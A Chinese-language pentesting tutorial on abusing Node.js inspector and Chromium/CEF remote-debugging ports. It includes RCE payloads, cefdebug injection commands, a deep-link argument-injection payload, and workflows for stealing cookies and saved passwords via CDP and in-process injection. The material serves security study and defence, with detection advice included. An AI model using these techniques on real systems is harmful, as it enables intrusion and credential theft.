# Node inspector/CEF 调试滥用

{{#include ../../banners/hacktricks-training.md}}

历史上的实战示例包括 Multimaster 演练，以及 CVE-2019-1414 Visual Studio Code debugger 攻击；应将它们视为特定版本的背景信息，而不要假设所有当前的 Electron 或 Chromium 目标都暴露相同的原语。<sup>[[1]](#references)[[3]](#references)</sup>

## 基本信息

[文档](https://nodejs.org/learn/getting-started/debugging)指出：使用 `--inspect` 开关启动时，Node.js 进程会监听调试客户端的连接。**默认情况下**，监听地址为主机和端口 **`127.0.0.1:9229`**。每个进程还会分配一个**唯一的** **UUID**。<sup>[[4]](#references)</sup>

Inspector 客户端必须知道并指定主机地址、端口和 UUID 才能连接。完整 URL 类似于 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。<sup>[[4]](#references)</sup>

> [!WARNING]
> 由于 **debugger 可完全访问 Node.js 执行环境**，能够连接此端口的恶意行为者可能可以代表 Node.js 进程执行任意代码（**潜在的权限提升**）。<sup>[[4]](#references)</sup>

启动 inspector 有几种方式：<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

当你启动一个正在检查的进程时，可能会出现类似这样的内容：<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

基于 **CEF**（**Chromium Embedded Framework**）的进程可以通过 `--remote-debugging-port=9222` 暴露调试器。它通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 暴露浏览器，而不是 Node.js inspector，因此默认情况下，基于 Node.js `process` 的 payload 并不直接适用。<sup>[[2]](#references)[[5]](#references)</sup>

启动带调试功能的浏览器时，会出现类似以下内容：<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### 枚举并驱动 CDP endpoint

HTTP 发现 endpoint 会区分 **browser** WebSocket 与各个 **target**（标签页、worker、扩展等）WebSocket。查询 `/json/version` 获取 browser endpoint，查询 `/json/list` 获取 targets；随后可直接使用 CDP 的类 JSON-RPC 消息驱动返回的 `webSocketDebuggerUrl` 值。<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

例如，使用 `websocat "$BROWSER_WS"` 连接并发送 `{"id":1,"method":"Target.getTargets"}` 或 `{"id":2,"method":"Storage.getCookies"}`。在页面 target 上（`websocat "$PAGE_WS"`），`Runtime.evaluate` 会在该 renderer 中执行，而 `Page.captureScreenshot` 会返回 base64 编码的截图。`document.cookie` 无法显示 `HttpOnly` cookie，而 `Storage.getCookies` 会向浏览器查询其 cookie store。<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### 浏览器、WebSockets 和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在 web 浏览器中打开的网站可以在浏览器安全模型下发起 WebSocket 和 HTTP 请求。要**获取唯一的 debugger session id**，必须先建立**初始 HTTP 连接**。**同源策略**会**阻止**网站建立**此 HTTP 连接**。为进一步防范 [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**，**Node.js 会验证连接的 **'Host' headers**，确保其精确指定一个 **IP address** 或 **`localhost`**。<sup>[[4]](#references)</sup>

> [!TIP]
> 这项**安全措施可防止攻击者仅通过发送 HTTP 请求**（可利用 SSRF 漏洞实现）来利用 inspector 运行代码。<sup>[[4]](#references)</sup>

### 在运行中的进程启动 inspector

你可以向正在运行的 nodejs 进程发送 **signal SIGUSR1**，使其在默认端口**启动 inspector**。但请注意，你需要拥有足够的权限，因此这可能会让你**获得对进程内信息的特权访问权限**，但不会直接导致权限提升。<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> 这在容器中很有用，因为**关闭进程并使用 `--inspect` 启动新进程**是**不可行的**，因为**容器**会随进程一起被**终止**。<sup>[[6]](#references)</sup>

### 连接到 inspector/debugger

要连接到基于 **Chromium** 的浏览器，可以分别访问 Chrome 或 Edge 的 `chrome://inspect` 或 `edge://inspect` URL。点击 Configure 按钮后，应确保已正确列出**目标主机和端口**。图中展示了一个 Remote Code Execution (RCE) 示例：<sup>[[2]](#references)[[4]](#references)</sup>

![随后会出现用于访问 debugger 的 URL。例如：ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - 连接到 inspector/debugger：要连接到基于 Chromium 的浏览器，...](<../../images/image (674).png>)

使用**命令行**可以连接到 debugger/inspector：<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 可以**查找**本地运行的 **inspectors**，并向其中**注入代码**。<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> 请注意，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器，**NodeJS RCE exploits 将无法生效**（你需要检查 API，找出可以用它做的有趣事情）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector 中的 RCE

> [!TIP]
> 如果你是来了解如何 [**通过 Electron 中的 XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

当你可以连接到 Node **inspector** 时，获取 **RCE** 的一些常见方法包括使用类似以下的方式（看起来这**在连接到 Chrome DevTools protocol 时无法生效**）：<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol 载荷

你可以在这里查看 API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)。<sup>[[5]](#references)</sup>
本节仅列出我发现有人曾用来利用此协议的一些有趣方法。

### Chrome 136+ 默认配置文件限制

从 **Chrome 136** 开始，如果 `--remote-debugging-port` 和 `--remote-debugging-pipe` 指向**默认 Chrome 数据目录**，Chrome 将忽略这些参数。必须将该开关与非标准的 `--user-data-dir` 配合使用；其独立的加密密钥和隔离的浏览器状态，可防止这种简单的基于标志的技术暴露用户正常登录的配置文件。未经验证，不应假定此 Chrome 特有限制也适用于旧版 Chrome、Chrome for Testing、Electron/CEF 应用或其他 Chromium 衍生版本。<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

因此，仅看到当前 Chrome 进程以 `--remote-debugging-port` 启动，**并不能**证明 CDP 已激活。请确认监听器和 `/json/version`，并确定实际使用的是哪个配置文件。<sup>[[14]](#references)</sup>

### 通过 Deep Link 注入参数

在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino Security 发现，一个基于 CEF 的应用在系统中**注册了自定义 URI**（workspaces://index.html），接收完整 URI，然后以部分根据该 URI 构造的配置**启动基于 CEF 的应用**。<sup>[[8]](#references)</sup>

研究人员发现，URI 参数会经过 URL 解码，并用于启动基于 CEF 的应用，因此用户可以在**命令行**中注入 **`--gpu-launcher`** 标志并执行任意内容。<sup>[[8]](#references)</sup>

因此，类似这样的 payload：

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

将执行 calc.exe。<sup>[[8]](#references)</sup>

### 覆盖文件

更改**下载文件的保存位置**，然后下载一个文件，以**恶意代码**来**覆盖**应用程序中经常使用的**源代码**。<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE 和数据外传

STAR Labs 展示了暴露的 WebDriver/CDP 服务可能允许任意文件读取和 RCE；在某些配置中，DNS rebinding 可以完成整个 exploit chain。<sup>[[9]](#references)</sup>

ChromeDriver 的 WebDriver 服务与 Chrome DevTools/CDP 不同。它的 [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) 用于选择启动新 session 时所用的浏览器可执行文件。如果未授权调用者能够访问以 root 身份运行的 ChromeDriver 服务，并提交一个包含调用者控制的可执行文件路径的 session，那么该启动操作就可能越过服务的权限边界。`/sessions` 返回空内容，并不能确定是否能够创建新 session。在判定该路径是否可用之前，应检查进程所有者、实际监听器的可达性、session 授权、可执行文件访问权限和隔离措施；仅凭进程名称或常用端口不足以得出结论。[Google 的安全指南](https://developer.chrome.com/docs/chromedriver/security-considerations)建议以未授权账户运行 ChromeDriver。被动枚举不应创建 WebDriver session。

如需了解更多历史上的浏览器自动化和 Chromium 安全案例，请参阅 Counter WebDriver write-up 以及 Project Zero issues 773、1742 和 1944。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 在运行中的 Chromium 进程内启用 CDP

Chrome 的默认 profile 限制只会阻止通过命令行启用 CDP。只要对浏览器进程拥有足够的同用户访问权限，就可以使用原版 [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) 和 Cobalt Strike 的 [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF)，在已运行的 `chrome.exe` 或 `msedge.exe` 进程内调用 Chromium 未导出的 `content::DevToolsAgentHost::StartRemoteDebuggingServer`。因此，该 endpoint 属于实际使用的 profile，并保留其标签页、扩展、cookies 和已认证状态。<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

对于常规 x64 Chrome/Edge 进程，BOF 会查找浏览器窗口和已加载的 `chrome.dll`/`msedge.dll`，扫描远程 PE 以匹配掩码签名，分配 stubs 和 context block，临时替换窗口过程，然后在浏览器 **UI thread** 上分发最终调用。相关运行时输入包括 `StartRemoteDebuggingServer`、Chromium 的 `operator new`、`TCPServerSocketFactory::CreateForHttpServer` 以及 factory vtable。只有每个必需签名都存在唯一匹配项时，才会继续执行。<sup>[[15]](#references)[[16]](#references)</sup>

BOF 接受浏览器模式和可选端口。之后可以使用其 helper script 验证 endpoint 并收集 cookies；`chrome-iso` 则是针对 Chrome Windows Process Isolation 边界的独立路径。<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

`chrome-iso` 路径仅使用指向隔离进程的查询受限句柄。它会识别已安装且 PE 映像大小与实时进程相匹配的 `chrome.dll`，从该本地映像解析符号，并通过 Chromium 的 `WindowImpl` 分发机制、同步 `WM_COPYDATA` 以及现有映像中的 User32 hook 触达 UI 线程。<sup>[[16]](#references)</sup>

> [!WARNING]
> 这是一种**入侵后浏览器进程操纵**技术，并非未经身份验证的网络绕过。它依赖具体版本，因为相关 C++ 符号未导出，且可能在浏览器更新后发生变化。<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### 浏览器更新后刷新 signatures

使用目标上安装的准确版本 `chrome.dll` 或 `msedge.dll` 及其匹配的 PDB。Windows SDK 中的 `symchk.exe` 可下载符号；随后，仓库脚本会定位 `StartRemoteDebuggingServer`、推导 allocator/socket-factory 输入，或验证 BOF 中嵌入的每个 signature。<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

零命中或多命中结果不得替换为任意地址。如果已知的 `operator new` 或 `CreateForHttpServer` 模式变化太大，无法据此建立新掩码，请使用带有 PDB 的 `pe_signature_finder.py` 检查该符号，并推导出在目标模块中唯一的字节序列。<sup>[[16]](#references)[[18]](#references)</sup>

#### 使用 CDP Toolkit 提取经过身份验证的浏览器数据

此技术不会离线解密 App-Bound Encryption (ABE)，也不会移除设备绑定。相反，它将合法浏览器用作**解密预言机和经过身份验证的交互代理**：`Storage.getCookies` 会向运行中的浏览器请求其 Cookie 存储，而导航/屏幕录制工作流则让请求、存储、企业身份验证和设备绑定行为继续在受害者现有的浏览器中进行。<sup>[[17]](#references)[[18]](#references)</sup>

将 loopback CDP 监听器通过操作员的 pivot 转发后，[**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) 可以枚举并收集常见的制品。<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`、`tabs list`、`cookies dump` 和 `tabs screenshot` 大多是对 `/json/version`、目标列表、`Storage.getCookies` 和 `Page.captureScreenshot` 的封装。历史记录、书签、扩展程序和密码元数据则需要临时的 `chrome://`/`edge://` WebUI target：工具包会等待页面渲染，检查其模型或 DOM，收集结果，然后关闭该 target。<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` 更进一步：它会打开真实的已保存登录 origin，聚焦凭据字段，使用 CDP 输入事件选择原生 autofill 建议，然后读取填入的值。origin/端口/路径必须与已保存密码的 realm 高度匹配；由于建议弹窗是浏览器原生 UI，可见模式是可靠的默认选项。<sup>[[17]](#references)[[18]](#references)</sup>

对于实时交互，`browser-takeover screencast` 会传输画面帧，并向真实 target 发送输入（包括后台或屏幕外模式）。而 `browser-takeover proxy` 则在本地接受 HTTP 和 HTTPS `CONNECT` 请求，并通过隐藏的 Chrome target 发出上游请求；如果隐藏 target 不可用，则回退到后台标签页。这样可以保留受害者的网络/身份验证上下文，但对于复杂的客户端应用，效果不够逼真，因为返回的内容由操作者的浏览器渲染。<sup>[[17]](#references)[[18]](#references)</sup>

检测时，不要只依赖 `--remote-debugging-*` 命令行遥测：还应将浏览器进程上异常的句柄和内存操作（`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`、线程创建）、DLL 注入，以及由 Chrome/Edge 持有的异常 loopback 监听套接字进行关联分析。<sup>[[15]](#references)</sup>

### Post-Exploitation

在真实环境中，**攻陷**使用 Chromium-based 浏览器的用户 PC 后，一种历史技术是重新启动浏览器并启用调试，然后转发 loopback 端口。在仍接受所选 profile 的产品/版本上，这可能暴露受害者的浏览状态；但 Chrome 136+ 不会对其默认数据目录采用此方式。<sup>[[7]](#references)[[14]](#references)</sup>

下面保留了原始重启命令，适用于较旧版本或特定版本的目标。第二条命令是当前 Chrome 支持的形式，但它会创建一个隔离 profile，而不是重新打开受害者通常使用的已认证状态。<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

对于 macOS 专属的 Chromium relaunch、extension 和 CDP tradecraft，请参阅 [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)。



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger 检查与利用工具](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414：通过 Chrome DevTools Debugger 实现 Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js 调试指南 - 入门](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 题解 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation：滥用 Chrome 的调试功能，远程观察和控制浏览会话](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112：AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [你在跟我说话吗？- 通过 DNS Rebinding 和 CDP 实现 WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [反制 WebDriver - 从 Bot 到 RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [改进安全性的远程调试开关变更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [向运行中的 Edge 浏览器注入 CDP：深入了解 Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monster 回归](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
